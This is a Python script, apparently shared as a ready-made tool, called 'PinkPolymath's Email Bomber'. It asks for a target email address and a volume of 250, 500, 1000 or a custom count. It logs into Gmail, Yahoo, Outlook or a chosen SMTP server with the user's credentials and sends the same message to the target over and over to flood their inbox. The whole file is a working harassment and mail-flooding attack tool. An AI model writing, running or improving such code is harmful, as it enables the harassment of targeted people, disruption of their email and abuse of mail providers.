import smtplib
import sys

class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    # RED = '\033[91m'
    PINK = '\033[95m'

def banner():
    print(bcolors.PINK + '+[+[+[ PinkPolymath\'s Email Bomber ]+]+]+')
    print(bcolors.GREEN + '+[+[+[ Made with codes from w3w3w3 ]+]+]+')
    # print(f'{bcolors.RED}[+] Author: {bcolors.YELLOW}PinkPolymath{bcolors.GREEN}')
    print(bcolors.PINK + '''
                     \|/
                       `--+--'
                          |
                      ,--'#`--.
                      |#######|
                   _.-'#######`-._
                ,-'###############`-.
              ,'#####################`,         .___     .__         .
             |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
            |###########################|       [___[ | )[__)(_)[ | )[_)(/,[
           |#############################|
           |#############################|              Original Author: w3w3w3
           |#############################|              Revised Author: PinkPolymath
            |###########################|
             \#########################/
              `.#####################,'
                `._###############_,'
                   `--..#####..--'                                 ,-.--.
*.______________________________________________________________,' (Bomb)
                                                                    `--' ''')

class emailBomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.PINK + '\n + +[+[+[ Initializing Program ]+]+]+')
            self.target = str(input(bcolors.GREEN +'Enter target email<: '))
            self.mode = int(input(bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Invalid. Terminating program')
                sys.exit(1)
        except Exception as e:
            print(f'Error: {e}')
    
    def bomb(self):
        try: 
            print(bcolors.PINK + '\n +[+[+[ Setting up the Bomb ]+]+]+')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else: 
                self.amount = int(input(bcolors.GREEN +'Choose a CUSTOM amount then: '))
            
            print(bcolors.PINK + f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')

        except Exception as e:
            print(f'Error: {e}')
    
    def email(self):
        try:
            print(bcolors.PINK + '\n +[+[+[ Setting up the Email ]+]+]+')
            self.server = str(input(bcolors.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            defaultPort = True
            if self.server not in premade:
                defaultPort = False
                self.port = int(input(bcolors.GREEN + 'Enter port number <: '))
            
            if defaultPort == True:
                self.port = int(587)
            
            if self.server == '1':
                # self.server = smtplib.SMTP(host="smtp.gmail.com", port=self.port)
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server ='smtp-mail.outlook.com'
            
            self.fromAddr = str(input(bcolors.GREEN + 'Enter from address <: '))
            self.fromPwd = str(input(bcolors.GREEN + 'Enter from password <: '))
            self.subject = str(input(bcolors.GREEN + 'Enter subject <: '))
            self.message = str(input(bcolors.GREEN + 'Enter message <: '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port) # server
            self.s.ehlo() # say hello to the server
            self.s.starttls() # start tls to establish the secure connection
            self.s.ehlo() # say hello to the server
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'Error: {e}')
    
    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(bcolors.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f'Error: {e}')
    
    def attack(self):
        print(bcolors.PINK + '\n+[+[+[ Attacking... ]+]+]+')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(bcolors.PINK + '\n+[+[+[ Attack finished ]+]+]+')
        sys.exit(0)

if __name__ == '__main__':
    banner()
    pinkBomb = emailBomber()
    pinkBomb.bomb()
    pinkBomb.email()
    pinkBomb.attack()
